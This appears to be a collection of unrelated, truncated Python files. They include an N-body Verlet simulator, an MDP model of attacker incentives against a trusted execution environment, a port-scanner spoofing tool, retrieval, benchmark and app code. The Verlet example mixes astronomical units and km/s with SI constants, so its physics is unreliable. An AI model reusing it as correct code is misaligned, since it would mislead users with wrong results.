1738',\n      'nfs': 'Network File System protocol; RFC 2224',\n      'nntp': 'USENET news using NNTP access; RFC 1738',\n      'opaquelocktoken': 'RFC 2518',\n      'phone': '',\n      'pop': 'Post Office Protocol; RFC 2384',\n      'pop3': 'Post Office Protocol v3',\n      'pres': 'Presence; RFC 3859',\n      'printer': '',\n      'prospero': 'Prospero Directory Service; RFC 4157',\n      'rdar': ('URLs found in Darwin source '\n                '(http://www.opensource.apple.com/darwinsource/).'),\n      'res': '',\n      'rtsp': 'real time streaming protocol; RFC 2326',\n      'rvp': '',\n      'rwhois': '',\n      'rx': 'Remote Execution',\n      'sdp': '',\n      'service': 'service location; RFC 2609',\n      'shttp': 'secure hypertext transfer protocol',\n      'sip': 'Session Initiation Protocol; RFC 3261',\n      'sips': 'secure session intitiaion protocol; RFC 3261',\n      'smb': 'SAMBA filesystems.',\n      'snews': 'For NNTP postings via SSL',\n      'snmp': 'Simple Network Management Protocol; RFC 4088',\n      'soap.beep': 'RFC 3288',\n      'soap.beeps': 'RFC 3288',\n      'ssh': 'Reference to interactive sess",
    "import math\r\n\r\ndef force2(m1, p1, m2, p2):\r\n    G = 6.67e-11  # constante de gravitation universelle en N\u00b7m\u00b2/kg\u00b2\r\n    r = [p2[i] - p1[i] for i in range(3)]\r\n    r_magnitude = math.sqrt(sum([r[i]**2 for i in range(3)]))\r\n    force_magnitude = G * m1 * m2 / r_magnitude**3\r\n    force = [force_magnitude * r[i] for i in range(3)]\r\n    return force\r\n\r\ndef forceN(j, m, pos):\r\n    N = len(m)\r\n    force_total = [0.0, 0.0, 0.0]\r\n    for k in range(N):\r\n        if k != j:\r\n            force = force2(m[j], pos[j], m[k], pos[k])\r\n            force_total = [force_total[i] + force[i] for i in range(3)]\r\n    return force_total\r\n\r\ndef verlet_step(m, pos, vit, h):\r\n    N = len(m)\r\n    new_pos = []\r\n    new_vit = []\r\n\r\n    for j in range(N):\r\n        F_j = forceN(j, m, pos)\r\n        new_pos_j = [\r\n            pos[j][k] + h * vit[j][k] + 0.5 * h**2 * F_j[k] / m[j]\r\n            for k in range(3)\r\n        ]\r\n        new_pos.append(new_pos_j)\r\n    \r\n    for j in range(N):\r\n        F_j = forceN(j, m, pos)\r\n        F_j_next = forceN(j, m, new_pos)\r\n        new_vit_j = [\r\n            vit[j][k] + 0.5 * h * (F_j[k] + F_j_next[k]) / m[j]\r\n            for k in range(3)\r\n        ]\r\n        new_vit.append(new_vit_j)\r\n    \r\n    return new_pos, new_vit\r\n\r\ndef simulation_verlet(deltat, n):\r\n    \"\"\"\r\n    Simule les positions des corps en utilisant le sch\u00e9ma d'int\u00e9gration de Verlet.\r\n    \r\n    Param\u00e8tres:\r\n    deltat (float): Incr\u00e9ment de temps en secondes.\r\n    n (int): Nombre d'it\u00e9rations.\r\n    \r\n    Retourne:\r\n    list of list of list of float: Liste des positions des corps pour chaque instant t0, t0 + deltat, ..., t0 + n*deltat.\r\n    \"\"\"\r\n    positions = [p0]\r\n    current_pos = p0\r\n    current_vit = v0\r\n\r\n    for _ in range(n):\r\n        new_pos, new_vit = verlet_step(masse, current_pos, current_vit, deltat)\r\n        positions.append(new_pos)\r\n        current_pos, current_vit = new_pos, new_vit\r\n    \r\n    return positions\r\n\r\n# Exemple de test\r\nt0 = 0  # date des conditions initiales\r\np0 = [[0, 0, 0], [1, 0, 0]]  # positions initiales en unit\u00e9 astronomique\r\nv0 = [[0, 0, 0], [0, 1, 0]]  # vitesses initiales en km/s\r\nmasse = [5.972e24, 7.348e22]  # masses en kg\r\ndeltat = 60  # incr\u00e9ment de temps en secondes\r\nn = 100  # nombre d'it\u00e9rations\r\n\r\npositions = simulation_verlet(deltat, n)\r\nprint(positions)",
    "import numpy as np\nimport mdptoolbox\n\n# Defining Parameters\np = 0.05        # Probability of triggering the challenge mechanism\nq_d = 1         # Probability of true positives\nq_h = 0         # Probability of false positives\nR = 0.5         # Reward for completing the computation\nC = 0.45        # Cost for completing the computation\nC_1 = 0.45      # Cost for just decrypting the data\ndiscount = 0.96 # Discount factor\nK = 1000        # Cost of breaking the TEE (Trusted Execution Environment)\nS = 100         # Cost of replacing the device \nW = 1           # Reward of knowing private data\nU = 1           # Reward of altering the data\n\n# States are enumerated as follows:\n# Type A: 0\n# Type B1: 1\n# Type B2: 2\n# Restart: 3\n\n# Defining the Transition Model\n# Dimensions: (number of actions, number of states, number of next states)\ntransition_model = np.zeros((3, 4, 4))\n\n# Action 1 (a_A)\ntransition_model[0, :, :] = np.array([\n    [1 - p*q_h, 0, 0, p*q_h],  # From state 0 to state 0\n    [0, 1, 0, 0],  # From state 1 to state 1\n    [0, 0, 1, 0],  # From state 2 to state 2\n    [1 - p*q_h, 0, 0, p*q_h]   # From state 3 to state 0 (restart)\n])\n\n# Action 2 (a_B1)\ntransition_model[1, :, :] = np.array([\n    [0, 1 - p*q_h, 0, p*q_h],  # From state 0 to state 1\n    [0, 1 - p*q_h, 0, p*q_h],  # From state 1 to state 1\n    [0, 1 - p*q_h, 0, p*q_h],  # From state 2 to state 1\n    [0, 0, 0, 1]   # From state 3 to state 3 (restart)\n])\n\n# Action 3 (a_B2)\ntransition_model[2, :, :] = np.array([\n    [0, 0, 1 - p*q_d, p*q_d],  # From state 0 to state 2 or 3\n    [0, 0, 1 - p*q_d, p*q_d],  # From state 1 to state 2 or 3\n    [0, 0, 1 - p*q_d, p*q_d],  # From state 2 to state 2 or 3\n    [0, 0, 0, 1]           # From state 3 to state 3 (restart)\n])\n\n# Check that all transition probabilities sum to 1\nfor a in range(transition_model.shape[0]):\n    for s in range(transition_model.shape[1]):\n        row_sum = np.sum(transition_model[a, s, :])\n        if not np.isclose(row_sum, 1.0):\n            print(f\"Warning: transition probabilities for action {a}, state {s} sum to {row_sum:.3f} (should be 1.0).\")\n\n\n# Defining the Reward Model\n# Dimensions: (number of actions, number of states, number of next states)\nreward_model = np.zeros((3, 4, 4))\n\n# Action 1 (a_A)\nreward_model[0, :, :] = np.array([\n    [R - C, 0, 0, -C],  # Reward\n    [0, 0, 0, 0],      # No reward for transitioning from state 1\n    [0, 0, 0, 0],      # No reward for transitioning from state 2\n    [-S, 0, 0, -S]      # Cost for restarting from state 3\n])\n\n# Action 2 (a_B1)\nreward_model[1, :, :] = np.array([\n    [0, -K + R - C + W, 0, -K - C + W], \n    [0, R - C + W, 0, - C + W],      \n    [0, R - C + W, 0, - C + W],      \n    [0, 0, 0, 0]               \n])\n\n# Action 3 (a_B2)\nreward_model[2, :, :] = np.array([\n    [0, 0, -K + R - C_1 + W + U, -K - C_1 + W], \n    [0, 0, R - C_1 + W + U, -C_1 + W],          \n    [0, 0, R - C_1 + W + U, -C_1 + W],          \n    [0, 0, 0, 0]                                \n])\n\ninitial_policy = np.zeros(4, dtype=int)  \n\npi = mdptoolbox.mdp.PolicyIteration(transition_model, reward_model, discount, policy0=initial_policy, max_iter=1000000) \npi.run()\n\n# Outputting the optimal policy and value function\nprint(\"The Policy:\", pi.policy)             # Optimal action for each state\nprint(\"The value funciton is:\", pi.V)       # Value function for each state\n",
    "import os\nimport cv2\nimport random\nimport logging\nimport textwrap\nimport subprocess\nfrom PIL import Image, ImageDraw, ImageFont\nfrom gtts import gTTS\nfrom utils import ensure_dir_exists\n\nclass VideoCreator:\n    def __init__(self, settings):\n        \"\"\"Initialize VideoCreator with settings\"\"\"\n        self.settings = settings\n        self.logger = logging.getLogger(__name__)\n        \n        # Log paths\n        self.logger.info(f\"Assets directory: {settings['paths']['assets_dir']}\")\n        self.logger.info(f\"Temp directory: {settings['paths']['temp_dir']}\")\n        self.logger.info(f\"Font path: {settings['paths']['font_path']}\")\n        \n        # Ensure directories exist\n        ensure_dir_exists(settings['paths']['assets_dir'])\n        ensure_dir_exists(settings['paths']['temp_dir'])\n        \n    def create_video(self, title, description, images, audio_text):\n        \"\"\"Create a video with the given content\"\"\"\n        try:\n            # Create title frame\n            title_frame_path = os.path.join(self.settings['paths']['temp_dir'], \"frame_title.png\")\n            self._create_title_frame(title, description, title_frame_path)\n            \n            # Create content frames\n            content_frames = []\n            for i, image_path in enumerate(images):\n                frame_path = os.path.join(self.settings['paths']['temp_dir'], f\"frame_content_{i}.png\")\n                self._create_content_frame(image_path, frame_path)\n                content_frames.append(frame_path)\n                \n            # Create video from frames\n            video_path = os.path.join(self.settings['paths']['temp_dir'], \"temp_video.avi\")\n            self._create_video_from_frames([title_frame_path] + content_frames, video_path)\n            \n            # Create audio\n            audio_path = os.path.join(self.settings['paths']['temp_dir'], \"temp_audio.mp3\")\n            self._create_audio(audio_text, audio_path)\n            \n            # Combine video and audio\n            final_path = os.path.join(self.settings['paths']['temp_dir'], \"final_video.mp4\")\n            self._add_audio_to_video(video_path, audio_path, final_path)\n            \n            return final_path\n            \n        except Exception as e:\n            self.logger.error(f\"Error creating video: {str(e)}\")\n            return None\n            \n    def _create_title_frame(self, title, description, output_path):\n        \"\"\"Create title frame with text overlay\"\"\"\n        try:\n            # Select random background\n            bg_dir = os.path.join(self.settings['paths']['assets_dir'], \"backgrounds\")\n            bg_files = [f for f in os.listdir(bg_dir) if f.endswith(('.jpg', '.png'))]\n            bg_path = os.path.join(bg_dir, random.choice(bg_files))\n            self.logger.info(f\"Using background: {bg_path}\")\n            \n            # Create frame\n            img = Image.open(bg_path)\n            draw = ImageDraw.Draw(img)\n            \n            # Load fonts\n            title_font = ImageFont.truetype(self.settings['paths']['font_path'], 55)\n            desc_font = ImageFont.truetype(self.settings['paths']['font_path'], 25)\n            \n            # Add title\n            bbox = draw.textbbox((0, 0), title, font=title_font)\n            text_width = bbox[2] - bbox[0]\n            x = (img.width - text_width) // 2\n            draw.text((x, 75), title, (0, 0, 0), font=title_font)\n            \n            # Add description\n            margin = 245\n            for line in textwrap.wrap(description, width=54):\n                bbox = draw.textbbox((0, 0), line, font=desc_font)\n                text_width = bbox[2] - bbox[0]\n                x = (img.width - text_width) // 2\n                draw.text((x, margin), line, (0, 0, 0), font=desc_font)\n                margin += desc_font.size + 10\n                \n            # Save frame\n            self.logger.info(f\"Saving frame to: {output_path}\")\n            img.save(output_path)\n            \n        except Exception as e:\n            self.logger.error(f\"Error creating title frame: {str(e)}\")\n            raise\n            \n    def _create_content_frame(self, image_path, output_path):\n        \"\"\"Create content frame from image\"\"\"\n        try:\n            self.logger.info(f\"Loading image: {image_path}\")\n            self.logger.info(f\"Creating content frame from: {image_path}\")\n            \n            # Load and resize image if needed\n            img = Image.open(image_path)\n            if img.size != (1280, 720):\n                img = img.resize((1280, 720), Image.LANCZOS)\n                \n            # Save frame\n            self.logger.info(f\"Saving frame to: {output_path}\")\n            img.save(output_path)\n            \n        except Exception as e:\n            self.logger.error(f\"Error creating content frame: {str(e)}\")\n            raise\n            \n    def _create_video_from_frames(self, frame_paths, output_path):\n        \"\"\"Create video from frames\"\"\"\n        try:\n            self.logger.info(f\"Creating video at: ",
    "#!/usr/bin/env python3\n# ===============================================================\n# PhantomGate (Python version, extended bracket parsing)\n# Created by Vladislav Tislenko (keklick1337) in 2025\n# A minimalistic Python port spoofer to confuse port scanners,\n# with enhanced error handling, auto-fix for invalid signatures,\n# and expanded bracket parsing in regex mode (mimicking the C99 logic).\n# ===============================================================\n\nimport argparse\nimport random\nimport socket\nimport threading\nimport sys\nimport os\nimport logging\nimport shutil\nfrom typing import Optional\n\nVERSION = \"0.1.3\"\nlogger = logging.getLogger(\"phantomgate\")\n\n###############################################################################\n# 1) LOG CONFIGURATION\n###############################################################################\ndef configure_logging(debug: bool, verbose: bool, quiet: bool, logfile: Optional[str] = None) -> None:\n    \"\"\"\n    Configures the logging level and format based on user arguments.\n    If logfile is provided, logs are also written there with timestamps.\n    \"\"\"\n    handler = logging.StreamHandler(sys.stdout)\n    formatter = logging.Formatter(\"[%(levelname)s] %(message)s\")\n    handler.setFormatter(formatter)\n    logger.addHandler(handler)\n\n    if logfile:\n        file_handler = logging.FileHandler(logfile, mode=\"a\", encoding=\"utf-8\")\n        file_formatter = logging.Formatter(\n            \"%(asctime)s [%(levelname)s] %(message)s\", datefmt=\"%Y-%m-%d %H:%M:%S\"\n        )\n        file_handler.setFormatter(file_formatter)\n        logger.addHandler(file_handler)\n\n    if debug:\n        logger.setLevel(logging.DEBUG)\n    elif verbose:\n        logger.setLevel(logging.INFO)\n    elif quiet:\n        logger.setLevel(logging.ERROR)\n    else:\n        logger.setLevel(logging.WARNING)\n\n\n###############################################################################\n# 2) SIGNATURE TYPES AND PARSING\n###############################################################################\ndef looks_like_regex(line: str) -> bool:\n    \"\"\"\n    Simple heuristic to decide if the line should be treated as a 'regex'.\n    We check for backslash tokens (\\\\d, \\\\w, \\\\., \\\\x) or parentheses '(' / '['.\n    \"\"\"\n    if \"\\\\d\" in line or \"\\\\w\" in line or \"\\\\.\" in line or \"\\\\x\" in line:\n        return True\n    if \"(\" in line or \"[\" in line:\n        return True\n    return False\n\n\ndef auto_fix_regex(s: str) -> str:\n    \"\"\"\n    Tries to 'auto-fix' unmatched parentheses or brackets:\n      - If we see a ')' or ']' without a matching '(' or '[', replace with '_'.\n      - If there are leftover '(' or '[', replace them with '_'.\n    Minimally prevents crashes in the naive parser.\n    \"\"\"\n    arr = list(s)\n    open_paren = 0\n    open_brack = 0\n\n    # First pass: handle unmatched closing\n    for i, c in enumerate(arr):\n        if c == '(':\n            open_paren += 1\n        elif c == ')':\n            if open_paren > 0:\n                open_paren -= 1\n            else:\n                arr[i] = '_'\n        elif c == '[':\n            open_brack += 1\n        elif c == ']':\n            if open_brack > 0:\n                open_brack -= 1\n            else:\n                arr[i] = '_'\n\n    # Second pass: replace leftover '(' or '['\n    if open_paren > 0 or open_brack > 0:\n        for i, c in enumerate(arr):\n            if open_paren > 0 and c == '(':\n                arr[i] = '_'\n                open_paren -= 1\n            if open_brack > 0 and c == '[':\n                arr[i] = '_'\n                open_brack -= 1\n            if open_paren == 0 and open_brack == 0:\n                break\n\n    return \"\".join(arr)\n\n\ndef parse_signatures(file_path: str):\n    \"\"\"\n    Reads the signature file in binary mode, then decodes each line as Latin-1\n    to preserve every possible 8-bit character. Returns a list of tuples:\n      [(\"raw\", b\"...\", b\"original_line\"), (\"regex\", \"...\", b\"original_line\"), ...]\n    If a line looks like a regex, store (\"regex\", auto_fixed_string).\n    Otherwise, treat it as raw, unescaping \\\\r, \\\\n, \\\\xNN, etc.\n    \"\"\"\n    if not os.path.isfile(file_path):\n        raise FileNotFoundError(f\"Could not open file: {file_path}\")\n\n    signatures = []\n    with open(file_path, \"rb\") as f:\n        # Read raw bytes, split by lines\n        lines = f.read().splitlines()\n\n    for idx, raw_line in enumerate(lines, start=1):\n        # Remove trailing newlines: handle b'\\r' and/or b'\\n'\n        raw_line = raw_line.rstrip(b\"\\r\\n\")\n        if not raw_line.strip():\n            continue\n\n        # Decode as Latin-1 to preserve all 0-255 bytes\n        try:\n            line_decoded = raw_line.decode(\"latin-1\")\n        except UnicodeDecodeError:\n            line_decoded = raw_line.decode(\"latin-1\", errors=\"replace\")\n\n        line_stripped = line_decoded.strip()\n        if not line_stripped:\n            continue\n\n        if looks_like_regex(line_stripped):\n            # Regex type\n            fixed_line = auto_fix_regex(line_stripped)\n            signa",
    "### Build Index\n\nfrom langchain_community.vectorstores import Chroma\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain.retrievers import EnsembleRetriever, BM25Retriever\nfrom dotenv import load_dotenv\nfrom subgraph.graph_states import ResearcherState, QueryState\nfrom utils.prompt import GENERATE_QUERIES_SYSTEM_PROMPT\nfrom langchain_core.documents import Document\nfrom typing import Any, Literal, TypedDict, cast\n\nfrom langchain_core.messages import BaseMessage\nfrom langchain_core.runnables import RunnableConfig\nfrom langgraph.graph import END, START, StateGraph\nfrom langchain_openai import ChatOpenAI\nfrom langgraph.types import Send\n\n\nfrom langchain.retrievers.contextual_compression import ContextualCompressionRetriever\nfrom langchain_cohere import CohereRerank\nfrom langchain_community.llms import Cohere\nimport logging\nfrom utils.utils import config\n\nload_dotenv()\n\nlogger = logging.getLogger(__name__)\n\n# Vector store configuration\nVECTORSTORE_COLLECTION = config[\"retriever\"][\"collection_name\"]\nVECTORSTORE_DIRECTORY = config[\"retriever\"][\"directory\"]\nTOP_K = config[\"retriever\"][\"top_k\"]\nTOP_K_COMPRESSION = config[\"retriever\"][\"top_k_compression\"]\nENSEMBLE_WEIGHTS = config[\"retriever\"][\"ensemble_weights\"]\nCOHERE_RERANK_MODEL = config[\"retriever\"][\"cohere_rerank_model\"]\n\ndef _setup_vectorstore() -> Chroma:\n    \"\"\"\n    Set up and return the Chroma vector store instance.\n    \"\"\"\n    embeddings = OpenAIEmbeddings()\n    return Chroma(\n        collection_name=VECTORSTORE_COLLECTION,\n        embedding_function=embeddings,\n        persist_directory=VECTORSTORE_DIRECTORY\n    )\n\n\n\ndef _load_documents(vectorstore: Chroma) -> list[Document]:\n    \"\"\"\n    Load documents and metadata from the vector store and return them as Langchain Document objects.\n\n    Args:\n        vectorstore (Chroma): The vector store instance.\n\n    Returns:\n        list[Document]: A list of Document objects containing the content and metadata.\n    \"\"\"\n    all_data = vectorstore.get(include=[\"documents\", \"metadatas\"])\n    documents: list[Document] = []\n\n    for content, meta in zip(all_data[\"documents\"], all_data[\"metadatas\"]):\n        if meta is None:\n            meta = {}\n        elif not isinstance(meta, dict):\n            raise ValueError(f\"Expected metadata to be a dict, but got {type(meta)}\")\n\n        documents.append(Document(page_content=content, metadata=meta))\n\n    return documents\n\n\n\n\ndef _build_retrievers(documents: list[Document], vectorstore: Chroma) -> ContextualCompressionRetriever:\n    \"\"\"\n    Build and return a compression retriever that includes\n    an ensemble retriever and Cohere-based contextual compression.\n\n    Args:\n        documents (list[Document]): List of Document objects.\n        vectorstore (Chroma): The vector store to use for building retrievers.\n\n    Returns:\n        ContextualCompressionRetriever: A compression retriever that can be used to fetch and re-rank documents.\n    \"\"\"\n    # Create base retrievers\n    retriever_bm25 = BM25Retriever.from_documents(documents, search_kwargs={\"k\": TOP_K})\n    retriever_vanilla = vectorstore.as_retriever(search_type=\"similarity\", search_kwargs={\"k\": TOP_K})\n    retriever_mmr = vectorstore.as_retriever(search_type=\"mmr\", search_kwargs={\"k\": TOP_K})\n\n    # Ensemble retriever\n    ensemble_retriever = EnsembleRetriever(\n        retrievers=[retriever_vanilla, retriever_mmr, retriever_bm25],\n        weights=ENSEMBLE_WEIGHTS,\n    )\n\n    # Set up Cohere re-ranking\n    compressor = CohereRerank(top_n=TOP_K_COMPRESSION, model=COHERE_RERANK_MODEL)\n\n    # Build compression retriever\n    compression_retriever = ContextualCompressionRetriever(\n        base_compressor=compressor,\n        base_retriever=ensemble_retriever,\n    )\n\n    return compression_retriever\n\n\nvectorstore = _setup_vectorstore()\ndocuments = _load_documents(vectorstore)\n\n# Build the compression retriever (with Cohere inside)\ncompression_retriever = _build_retrievers(documents, vectorstore)\n\n\nasync def generate_queries(\n    state: ResearcherState, *, config: RunnableConfig\n) -> dict[str, list[str]]:\n    \"\"\"Generate search queries based on the question (a step in the research plan).\n\n    This function uses a language model to generate diverse search queries to help answer the question.\n\n    Args:\n        state (ResearcherState): The current state of the researcher, including the user's question.\n        config (RunnableConfig): Configuration with the model used to generate queries.\n\n    Returns:\n        dict[str, list[str]]: A dictionary with a 'queries' key containing the list of generated search queries.\n    \"\"\"\n\n    class Response(TypedDict):\n        queries: list[str]\n\n    logger.info(\"---GENERATE QUERIES---\")\n    model = ChatOpenAI(model=\"gpt-4o-mini-2024-07-18\", temperature=0)\n    messages = [\n        {\"role\": \"system\", \"content\": GENERATE_QUERIES_SYSTEM_PROMPT},\n        {\"role\": \"human\", \"content\": state.question},\n    ]\n    response = cast(Response, await model.with_structured_output(Response).ainvoke(messages))",
    "'''\nMIT License\n\nCopyright (c) 2025 Jayaraman R P\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n'''\n#Sample Result: https://www.edaplayground.com/x/hpt2\nimport pyslang\nimport argparse\nimport re\nimport logging\nfrom tabulate import tabulate\nimport os\nimport shutil\nimport time\n\nport_list          = list()  #Store list of all Ports\ninput_list         = list()  #Store list of in Ports\ninput_declarators  = list()  #Stroe list of input declarators\noutput_list        = list()  #Store list of out Ports\noutput_declarators = list()  #Stroe list of output declarators\nall_declarators    = list()  #Contains both input and output declarators\nclk_rst_list       = list()  #Stroe list of output declarators\ncr_list            = list()  #List with Clock and reset\nonly_clk           = list()  #List only with Clock signal\nonly_rst           = list()  #List Only with reset signal\nex_cr              = list()  #List without Clock and Reset\nparam_list         = list()  #List of parameters available\ncp_in_list         = list()\n'''\nCreating a \"tb\" folder to save the generated UVM testbench\n'''\nfolder_name =\"tb\"\nif not os.path.exists(folder_name):\n  os.makedirs(folder_name)\nelif os.path.exists(folder_name):\n  shutil.rmtree(folder_name) #Remove if there is an existing folder/files\n  os.makedirs(folder_name)\n\n\"\"\"\nCollects port data from the Verilog design.\n\nThis function logs debug information about each port found in the design,\nincluding direction, declarators, and data width. It then appends the port\ndata to the port_list and categorizes it as input or output.\n\nArgs:\n  None\n\nReturns:\n  None\n\"\"\"\ndef collect_port_data():\n    logging.debug(\"Port found in the design: \" + str(m_i))  #List of ports used in the verilog file Eg: input [DATA_WIDTH-1:0]din;\n    logging.debug(\"Port Direction          : \" + str(m_i.header.direction)) #Eg: input\n    logging.debug(m_i.header.direction)\n    logging.debug(\"Port Declarators        : \" + str(m_i.declarators)) #Eg: din\n    logging.debug(\"Port Data width         : \" + str(m_i.header.dataType))  #[DATA_WIDTH-1:0]\n    logging.debug(dir(m_i.kind))\n    logging.debug(dir(m_i.kind.name.format))\n    logging.debug(m_i)\n    port_list.append(m_i)\n    if(m_i.header.direction.kind.name == 'InputKeyword'):\n        input_list.append(str(m_i))\n        input_declarators.append(str(m_i.declarators))\n        all_declarators.append(str(m_i.declarators))\n    elif(m_i.header.direction.kind.name == 'OutputKeyword'):\n        output_list.append(m_i)\n        output_declarators.append(str(m_i.declarators))\n        all_declarators.append(str(m_i.declarators))\n\n\"\"\"\nCollects parameter data from the Verilog design.\n\nThis function logs debug information about each parameter found in the design.\nIt then appends the parameter data to the param_list.\n\nArgs:\n  None\n\nReturns:\n  None\n\"\"\"\ndef collect_param_data():\n    logging.debug(m_i)\n    param_list.append(str(m_i))\n\n\"\"\"\nParses command-line arguments using argparse.\n\nThis function creates an ArgumentParser, adds a required test argument,\nan optional mode argument, and an optional coverage argument,\nand returns the parsed arguments.\n\nArgs:\n  None\n\nReturns:\n  args (argparse.Namespace): Parsed command-line arguments\n\"\"\"\ndef eda_argparse():\n    # Create the parser\n    parser = argparse.ArgumentParser()\n    # Add a required test argument\n    parser.add_argument('-t', '--test', type=str, required=True)\n    # Add an optional mode argument with a default value 'edaplayground'\n    parser.add_argument('-m', '--mode', type=str, choices=['verilator', 'edaplayground'], default='edaplayground', help='Simulation mode: verilator or edaplayground(default: edaplayground)')\n    # Add an optional coverage argument\n    parser.add_argument('-c', '--coverage', action='store_true', help='Enable coverage in verilator mode')\n    # Parse the argument\n    args = parser.parse_args()\n    return args\n\n\"\"\"\nSanitizes the DUT name to be a valid folder name.\n\nThis function removes any characters that are not alphanumeric or underscores.\nIt also ensures the name st",
    "import os\nos.environ['HF_ENDPOINT']='https://hf-mirror.com'\nimport sys\nsys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))\nfrom datasets import load_dataset\nimport torch\nimport json\nfrom model.tokenization_internlm import InternLMTokenizer\nfrom model.internlm_ADA import InternLMForCausalLM\nfrom model.configuration_internlm import MyInternLMConfig\nfrom tqdm import tqdm\nimport numpy as np\nimport random\nimport argparse\n\n\ndef parse_args(args=None):\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--skip_sub_layer_num', type=int, default=8)\n    parser.add_argument('--model', type=str, default=\"internlm-ADA-E2E\")\n    return parser.parse_args(args)\n\n\ndef warmup_and_get_pred(warmup_dataset, target_datasets, dataset2prompt, dataset2maxlen, device, model_name, model_path, output_dir, SKIP_SUB_LAYER_NUM):\n    if not os.path.exists(f\"{output_dir}/{model_name}\"):\n        os.makedirs(f\"{output_dir}/{model_name}\")\n    device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n    model, tokenizer = load_model_and_tokenizer(model_path, SKIP_SUB_LAYER_NUM, device)\n    \n    # Warmup\n    warmup_data = load_dataset('THUDM/LongBench', f\"{warmup_dataset}\", split='test')\n    warmup_data_all = [data_sample for data_sample in warmup_data]\n    warm_up_count = 0\n    prompt_format = dataset2prompt[warmup_dataset]\n    for json_obj in tqdm(warmup_data_all):\n        if json_obj[\"length\"] <= 4000:\n            continue\n        prompt = prompt_format.format(**json_obj)\n        tokenized_prompt = tokenizer(prompt, truncation=False, return_tensors=\"pt\").input_ids[0]\n        if len(tokenized_prompt) > max_length:\n            half = int(max_length/2)\n            prompt = tokenizer.decode(tokenized_prompt[:half], skip_special_tokens=True)+tokenizer.decode(tokenized_prompt[-half:], skip_special_tokens=True)\n        if warmup_dataset not in [\"trec\", \"triviaqa\", \"samsum\", \"lsht\", \"lcc\", \"repobench-p\"]: # chat models are better off without build prompts on these tasks\n            prompt = f\"<|User|>:{prompt}<eoh>\\n<|Bot|>:\"\n        input = tokenizer(prompt, truncation=False, return_tensors=\"pt\").to(device)\n        context_length = input.input_ids.shape[-1]\n        if warmup_dataset == \"samsum\": # prevent illegal output on samsum (model endlessly repeat \"\\nDialogue\"), might be a prompting issue\n            output = model.generate(\n                **input,\n                max_new_tokens=1,\n                num_beams=1,\n                do_sample=False,\n                temperature=1.0,\n                min_length=context_length+1,\n                eos_token_id=[tokenizer.eos_token_id, tokenizer.encode(\"\\n\", add_special_tokens=False)[-1]],\n            )[0]\n        else:\n            output = model.generate(\n                **input,\n                max_new_tokens=1,\n                num_beams=1,\n                do_sample=False,\n                temperature=1.0,\n            )[0]\n        warm_up_count += 1\n        if warm_up_count >= 20:\n            break\n    \n    # Target    \n    for target_dataset in target_datasets:\n        out_path = f\"{output_dir}/{model_name}/{target_dataset}.jsonl\"\n        prompt_format = dataset2prompt[target_dataset]\n        max_gen = dataset2maxlen[target_dataset]\n        target_data = load_dataset('THUDM/LongBench', f\"{target_dataset}_e\", split='test')\n        target_data_all = [data_sample for data_sample in target_data]\n        for json_obj in tqdm(target_data_all):\n            if json_obj[\"length\"] <= 4000:\n                continue\n            prompt = prompt_format.format(**json_obj)\n            tokenized_prompt = tokenizer(prompt, truncation=False, return_tensors=\"pt\").input_ids[0]\n            if len(tokenized_prompt) > max_length:\n                half = int(max_length/2)\n                prompt = tokenizer.decode(tokenized_prompt[:half], skip_special_tokens=True)+tokenizer.decode(tokenized_prompt[-half:], skip_special_tokens=True)\n            if target_dataset not in [\"trec\", \"triviaqa\", \"samsum\", \"lsht\", \"lcc\", \"repobench-p\"]: # chat models are better off without build prompts on these tasks\n                prompt = f\"<|User|>:{prompt}<eoh>\\n<|Bot|>:\"\n            input = tokenizer(prompt, truncation=False, return_tensors=\"pt\").to(device)\n            context_length = input.input_ids.shape[-1]\n            if target_dataset == \"samsum\": # prevent illegal output on samsum (model endlessly repeat \"\\nDialogue\"), might be a prompting issue\n                output = model.generate(\n                    **input,\n                    max_new_tokens=max_gen,\n                    num_beams=1,\n                    do_sample=False,\n                    temperature=1.0,\n                    min_length=context_length+1,\n                    eos_token_id=[tokenizer.eos_token_id, tokenizer.encode(\"\\n\", add_special_tokens=False)[-1]],\n                )[0]\n            else:\n                output = model.generate(\n                    **input,\n                    max_new_tokens=max_gen,\n                    num_beams=1,\n  ",
    "import streamlit as st\r\nimport numpy as np\r\nimport pandas as pd\r\nimport pickle\r\n\r\n# Load the saved model, encoder, and scaler\r\nwith open('Gaussian_naive_bayes_model.pkl', 'rb') as model_file:\r\n    gnb = pickle.load(model_file)\r\n\r\nwith open('encoder.pkl', 'rb') as encoder_file:\r\n    encoder = pickle.load(encoder_file)\r\n\r\nwith open('scaler.pkl', 'rb') as scaler_file:\r\n    scaler = pickle.load(scaler_file)\r\n\r\n# Set the background image and text color using CSS\r\ndef set_background(png_file):\r\n    page_bg_img = f\"\"\"\r\n    <style>\r\n    .stApp {{\r\n        background: url(\"data:image/png;base64,{png_file}\");\r\n        background-size: cover;\r\n        background-position: center;\r\n        background-repeat: no-repeat;\r\n    }}\r\n    /* Set text color to black for all text elements */\r\n    h1, h2, h3, h4, h5, h6, p, span, div, label {{\r\n        color: white;\r\n        text-align: center; /* Center align text */\r\n    }}\r\n    .stButton > button {{\r\n        background-color: #4C4C6D; /* Button color */\r\n        color: white; /* Text color for button */\r\n        border-radius: 10px;\r\n        border: none;\r\n        padding: 10px 20px;\r\n        font-size: 16px;\r\n    }}\r\n    .stButton > button:hover {{\r\n        background-color: #6A5ACD; /* Button hover color */\r\n        color: white;\r\n    